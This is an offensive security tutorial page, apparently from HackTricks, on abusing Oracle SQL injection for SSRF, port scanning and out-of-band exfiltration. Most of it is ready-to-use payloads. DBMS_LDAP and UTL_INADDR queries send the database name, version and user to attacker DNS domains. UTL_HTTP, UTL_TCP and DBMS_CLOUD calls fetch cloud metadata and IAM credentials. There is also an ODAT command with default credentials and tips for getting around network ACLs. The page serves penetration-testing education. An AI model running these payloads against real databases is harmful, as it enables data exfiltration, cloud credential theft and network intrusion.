# Oracle injection

{{#include ../../banners/hacktricks-training.md}}

**Serve this post a wayback machine copy of the deleted post from [https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/](https://ibreak.software/2020/06/using-sql-injection-to-perform-ssrf-xspa-attacks/)**.

## SSRF

Using Oracle to do Out of Band HTTP and DNS requests is well documented but as a means of exfiltrating SQL data in injections. We can always modify these techniques/functions to do other SSRF/XSPA.

Installing Oracle can be really painful, especially if you want to set up a quick instance to try out commands. My friend and colleague at [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), pointed me to [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) that allowed me to setup an instance on a t2.large AWS Ubuntu machine and Docker.

I ran the docker command with the `--network="host"` flag so that I could mimic Oracle as an native install with full network access, for the course of this blogpost.

```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```

#### Oracle packages that support a URL or a Hostname/Port Number specification <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

In order to find any packages and functions that support a host and port specification, I ran a Google search on the [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html). Specifically,

```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```

The search returned the following results (not all can be used to perform outbound network)

- DBMS_NETWORK_ACL_ADMIN
- UTL_SMTP
- DBMS_XDB
- DBMS_SCHEDULER
- DBMS_XDB_CONFIG
- DBMS_AQ
- UTL_MAIL
- DBMS_AQELM
- DBMS_NETWORK_ACL_UTILITY
- DBMS_MGD_ID_UTL
- UTL_TCP
- DBMS_MGWADM
- DBMS_STREAMS_ADM
- UTL_HTTP

This crude search obviously skips packages like `DBMS_LDAP` (which allows passing a hostname and port number) as [the documentation page](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360) simply points you to a [different location](https://docs.oracle.com/database/121/ARPLS/d_ldap.htm#ARPLS360). Hence, there may be other Oracle packages that can be abused to make outbound requests that I may have missed.

In any case, let’s take a look at some of the packages that we have discovered and listed above.

**DBMS_LDAP.INIT**

The `DBMS_LDAP` package allows for access of data from LDAP servers. The `init()` function initializes a session with an LDAP server and takes a hostname and port number as an argument.

This function has been documented before to show exfiltration of data over DNS, like below

```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```

However, given that the function accepts a hostname and a port number as arguments, you can use this to work like a port scanner as well.

Here are a few examples

```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```

A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` shows that the port is closed while a session value points to the port being open.

**UTL_SMTP**

The `UTL_SMTP` package is designed for sending e-mails over SMTP. The example provided on the [Oracle documentation site shows how you can use this package to send an email](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). For us, however, the interesting thing is with the ability to provide a host and port specification.

A crude example is shown below with the `UTL_SMTP.OPEN_CONNECTION` function, with a timeout of 2 seconds

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```

A `ORA-29276: transfer timeout` shows port is open but no SMTP connection was estabilished while a `ORA-29278: SMTP transient error: 421 Service not available` shows that the port is closed.

**UTL_TCP**

The `UTL_TCP` package and its procedures and functions allow [TCP/IP based communication with services](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.

The example [on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.

```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
  retval pls_integer;
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
  retval pls_integer;
BEGIN
  c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
```

Interestingly, due to the ability to craft raw TCP requests, this package can also be used to query the Instance meta-data service of all cloud providers as the method type and additional headers can all be passed within the TCP request.

**UTL_HTTP and Web Requests**

Perhaps the most common and widely documented technique in every Out of Band Oracle SQL Injection tutorial out there is the [`UTL_HTTP` package](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070). This package is defined by the documentation as - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`

```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```

You could additionally, use this to perform some rudimentary port scanning as well with queries like

```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```

A `ORA-12541: TNS:no listener` or a `TNS:operation timed out` is a sign that the TCP port is closed, whereas a `ORA-29263: HTTP protocol error` or data is a sign that the port is open.

Another package I have used in the past with varied success is the [`GETCLOB()` method of the `HTTPURITYPE` Oracle abstract type](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) that allows you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET response from a URL as a [CLOB data type.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)

```
SELECT HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() FROM dual;
```

---

## Additional Packages & Techniques (Oracle 19c → 23c)

### UTL_INADDR – DNS-based exfiltration and host discovery

`UTL_INADDR` exposes simple name-resolution helpers that trigger an outbound DNS lookup from the database host.  Because only a domain is required (no port/ACL needed) it is a reliable primitive for blind-exfil when other network callouts are blocked.

```sql
-- Leak the DB name and current user via a DNS query handled by Burp Collaborator
SELECT UTL_INADDR.get_host_address(
         (SELECT name FROM v$database)||'.'||(SELECT user FROM dual)||
         '.attacker.oob.server') FROM dual;
```

`get_host_address()` returns the resolved IP (or raises `ORA-29257` if resolution fails).  The attacker only needs to watch for the incoming DNS request on the controlled domain to confirm code execution.

### DBMS_CLOUD.SEND_REQUEST – full HTTP client on Autonomous/23c

Recent cloud-centric editions (Autonomous Database, 21c/23c, 23ai) ship with `DBMS_CLOUD`.  The `SEND_REQUEST` function acts as a general-purpose HTTP client that supports custom verbs, headers, TLS and large bodies, making it far more powerful than the classical `UTL_HTTP`.

```sql
-- Assuming the current user has CREATE CREDENTIAL and network ACL privileges
BEGIN
  -- empty credential when no auth is required
  DBMS_CLOUD.create_credential(
      credential_name => 'NOAUTH',
      username        => 'ignored',
      password        => 'ignored');
END;
/

DECLARE
  resp  DBMS_CLOUD_TYPES.resp;
BEGIN
  resp := DBMS_CLOUD.send_request(
             credential_name => 'NOAUTH',
             uri             => 'http://169.254.169.254/latest/meta-data/',
             method          => 'GET',
             timeout         => 3);
  dbms_output.put_line(DBMS_CLOUD.get_response_text(resp));
END;
/
```

Because `SEND_REQUEST` allows arbitrary target URIs it can be abused via SQLi for:
1. Internal port scanning / SSRF to cloud metadata services.
2. Out-of-band exfiltration over HTTPS (use Burp Collaborator or an `ngrok` tunnel).
3. Callbacks to attacker servers even when older callout packages are disabled by ACLs.

ℹ️ If you only have a classical on-prem 19c but can create Java stored procedures, you can sometimes install `DBMS_CLOUD` from the OCI client bundle — useful in some engagements.

### Automating the attack surface with **ODAT**

[ODAT – Oracle Database Attacking Tool](https://github.com/quentinhardy/odat) has kept pace with modern releases (tested up to 19c, 5.1.1 – Apr-2022).  The `–utl_http`, `–utl_tcp`, `–httpuritype` and newer `–dbms_cloud` modules automatically:
* Detect usable callout packages/ACL grants.
* Trigger DNS & HTTP callbacks for blind extraction.
* Generate ready-to-copy SQL payloads for Burp/SQLMap.

Example: quick OOB check with default creds (takes care of ACL enumeration in the background):

```bash
odat all -s 10.10.10.5 -p 1521 -d XE -U SCOTT -P tiger --modules oob
```

### Recent network ACL restrictions & bypasses

Oracle tightened default Network ACLs in the July 2023 CPU — unprivileged accounts now receive `ORA-24247: network access denied by access control list` by default.  Two patterns still allow callouts through SQLi:
1. Target account owns an ACL entry (`DBMS_NETWORK_ACL_ADMIN.create_acl`) that was added by a developer for integrations.
2. The attacker abuses a high-privilege PL/SQL definer-rights routine (e.g. in a custom application) that *already* has `AUTHID DEFINER` and the necessary grants.

If you encounter `ORA-24247` during exploitation always search for reusable procedures:

```sql
SELECT owner, object_name
FROM   dba_objects
WHERE  object_type = 'PROCEDURE'
  AND  authid       = 'DEFINER';
```

(in many audits at least one reporting/export procedure had the needed rights).

---

## References

* Oracle Docs – `DBMS_CLOUD.SEND_REQUEST` package description and examples. 
* quentinhardy/odat – Oracle Database Attacking Tool (latest release 5.1.1, Apr-2022). 

{{#include ../../banners/hacktricks-training.md}}
